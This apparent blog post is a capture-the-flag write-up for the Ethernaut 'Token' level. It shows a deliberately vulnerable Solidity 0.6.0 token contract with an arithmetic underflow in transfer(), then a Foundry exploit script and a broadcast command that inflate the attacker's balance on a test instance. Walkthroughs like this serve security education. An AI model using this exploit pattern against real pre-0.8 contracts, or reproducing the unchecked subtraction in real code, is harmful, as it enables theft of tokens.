---
title: 'Token - The Ethernaut'
cover: https://ethernaut.openzeppelin.com/imgs/Level5.svg
categories: ["ctf"]
tags: ["blockchain","ethernaut"]
date: 2025-09-17
lastmod: 2025-09-17
---

## Challenge Overview

In this level, you start with 20 tokens and need to acquire additional tokens to complete the challenge. The contract contains a critical vulnerability due to arithmetic underflow in Solidity version 0.6.0, which allows an attacker to manipulate their token balance by attempting to transfer more tokens than they possess.

---

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

---

## Exploit Explanation

The vulnerability exists in the `transfer()` function:

```solidity
require(balances[msg.sender] - _value >= 0);
balances[msg.sender] -= _value;
```

In Solidity versions prior to 0.8.0, arithmetic operations do not automatically check for underflow/overflow. When you attempt to subtract a larger value from a smaller unsigned integer, the result **wraps around** to the maximum value of the type (2²⁵⁶ - 1) due to underflow.

The exploit works as follows:
1. You start with 20 tokens
2. You attempt to transfer 21 tokens (more than you have)
3. The calculation `balances[msg.sender] - _value` becomes `20 - 21`
4. This results in an underflow, wrapping around to an extremely large number (2²⁵⁶ - 1)
5. The require statement passes because the result is positive (albeit due to underflow)
6. Your balance is then set to this enormous value

---

## Exploit Script

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Token.sol";

contract TokenSolution is Script {
    Token public tokenInstance = Token(<YOUR_INSTANCE>);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // Check initial balance
        uint256 initialBalance = tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS"));
        console.log("Initial balance:", initialBalance);
        
        // Trigger the underflow by transferring more tokens than we have
        // Sending to address(0) to avoid affecting other balances
        tokenInstance.transfer(address(0), 21);
        
        // Check the new balance after the exploit
        uint256 newBalance = tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS"));
        console.log("New balance after exploit:", newBalance);
        
        vm.stopBroadcast();
    }
}
```

---

## Proof of Concept (PoC)

Execute the exploit with Foundry:

```bash
forge script script/TokenSolution.s.sol --rpc-url $SEPOLIA_URL --broadcast
```

> **Note:** In modern Solidity versions (0.8.0+), this vulnerability would be prevented by automatic overflow/underflow checks. However, since this contract uses version 0.6.0, the underflow occurs successfully, granting you an enormous token balance and completing the level.